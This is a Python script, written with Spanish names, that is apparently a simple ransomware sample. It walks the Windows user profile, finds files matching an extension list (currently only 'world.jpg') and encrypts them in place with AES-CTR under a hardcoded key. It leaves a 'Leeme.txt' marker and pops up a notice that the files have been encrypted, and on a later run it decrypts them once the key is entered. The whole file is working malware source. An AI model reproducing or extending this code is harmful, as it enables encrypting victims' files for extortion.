#!/usr/bin python
#_*_ coding: utf8 _*_

import os
import socket
import random
import hashlib
from Crypto.Util import Counter
from Crypto.Cipher import AES 
from Crypto import Random
from plyer import notification
import time

home = os.environ['USERPROFILE']
directorios = os.listdir(home)
directorios = [x for x in directorios if not x.startswith('.')]

ext = ['world.jpg']

def notificacion():
    for i in range(2):
        notification.notify(
            title = "Notificacion",
            message = "Lo siento pero tus archivos han sido encriptados",
            timeout=5,
        )
        time.sleep(2)

def crear_llave():   
    key = 'b41a7d6453f3cdc4e9bf6125d0185998'
    return key.encode()
    
def encriptar_desencriptar(archivo,modo,tamano=16):
    with open(archivo,'r+b') as archivocript:
        archivo_sin_cifrar = archivocript.read(tamano)
        while archivo_sin_cifrar:
            archivo_encriptado = modo(archivo_sin_cifrar)
            if len(archivo_sin_cifrar) != len(archivo_encriptado):
                raise ValueError('')
            archivocript.seek(- len(archivo_sin_cifrar), 1)
            archivocript.write(archivo_encriptado)
            archivo_sin_cifrar = archivocript.read(tamano)
   

def encontrar(llave):
    lista_encontrado = open('lista_encontrado','w+')
    for directorio in directorios:
        path = home+'/'+directorio       
        for ext1 in ext:
            for path1, carpeta, archivo in os.walk(path):
                for file in archivo:
                     if file.endswith(ext1):
                         lista_encontrado.write(os.path.join(path1, file)+'\n')
    lista_encontrado.close()
    lista = open('lista_encontrado','r')                                          
    lista = lista.read().split('\n')
    lista = [l for l in lista if not l == ""]

    if os.path.exists('leeme.txt'):
        llave1 = input('Introdusca la llave: ')
        if llave1 == 'b41a7d6453f3cdc4e9bf6125d0185998':
            c = Counter.new(128)
            crypto = AES.new(llave1.encode(),AES.MODE_CTR,counter=c)
            encriptarchivos = crypto.decrypt
            for element in lista:
                encriptar_desencriptar(element,encriptarchivos)
        print('Tus archivos han sido des encriptados correctamente..')
         
    else:
        c = Counter.new(128)
        crypto = AES.new(llave,AES.MODE_CTR, counter=c)
        Leeme = open('Leeme.txt','w+') 
        Leeme.write('No borres este archivo')
        Leeme.close()    
        encriptarchivos = crypto.encrypt
        for element in lista:
            encriptar_desencriptar(element,encriptarchivos)
        notificacion()
            

def test_internet():
        s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        try:
            s.connect(('socket.io', 80))
            print("conectado")
            s.close()
        except:
            exit()      
        
def main():
    
    #test_internet()
    llave = crear_llave()
    encontrar(llave)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
        
        
        
